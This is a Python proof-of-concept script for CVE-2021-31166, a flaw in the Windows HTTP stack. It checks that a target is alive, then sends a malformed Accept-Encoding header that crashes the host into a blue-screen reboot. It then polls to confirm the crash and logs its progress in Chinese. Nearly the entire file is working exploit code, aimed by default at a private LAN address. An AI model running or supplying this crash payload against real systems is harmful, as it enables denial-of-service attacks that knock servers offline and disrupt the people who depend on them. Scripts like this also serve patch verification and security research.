# Create by antx at 2021-09-27.
import requests
from loguru import logger
import time

header = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36'}

class CVE_2021_31166():
    @logger.catch(level='ERROR')
    def first_handshake(self, target: str):
        try:
            resp = requests.get(target, headers=header)
            if resp.status_code == 200:
                logger.info(f'首次握手: 目标主机正常, 可进行POC验证')
                return True
            logger.info(f'首次握手: 目标主机正常, 但返回异常, 状态码: {resp.status_code}')
            return False
        except Exception as e:
            logger.info(f'首次握手错误: 目标主机异常, 请检查目标主机是否存活, error resp: {e}')
            return False

    @logger.catch(level='ERROR')
    def verify_handshake(self, target: str):
        try:
            resp = requests.get(target, headers=header)
            if resp.status_code == 200:
                logger.info(f'验证结果: 目标主机已重启恢复正常')
                return False
            logger.info(f'验证结果: 目标主机已重启恢复正常, 但返回异常, 状态码: {resp.status_code}')
            return False
        except requests.exceptions.ConnectionError as e:
            logger.info(f'验证结果: 验证成功, 目标主机异常, 已被利用并进入蓝屏重启')
            return True

    @logger.catch(level='ERROR')
    def poc(self, target: str):
        headers = {'Accept-Encoding': 'doar-e, ftw, imo, ,',}
        try:
            r = requests.get(target, headers=headers, timeout=5)
            logger.info(f'POC握手失败: {target} 不存在 CVE-2021-31166 漏洞, 可能已经打过补丁')
            return False
        except requests.exceptions.ReadTimeout as e:
            logger.info(f'POC握手成功: {target} maybe can Exploit!')
            return True

    @logger.catch(level='ERROR')
    def dia(self, target: str):
        logger.info(f'开始验证: {target}')
        if not self.first_handshake(target):
            logger.info(f'{target} 不存在 CVE-2021-31166 漏洞')
        self.poc(target)
        logger.info(f'再次进行确定性验证')
        while True:
            time.sleep(10)
            if not self.verify_handshake(target):
                break
            logger.info(f'{target} have CVE-2021-31166 vulnerability, can be exploited!')


if __name__ == '__main__':
    cve = CVE_2021_31166()
    cve.dia("http://192.168.199.61/")
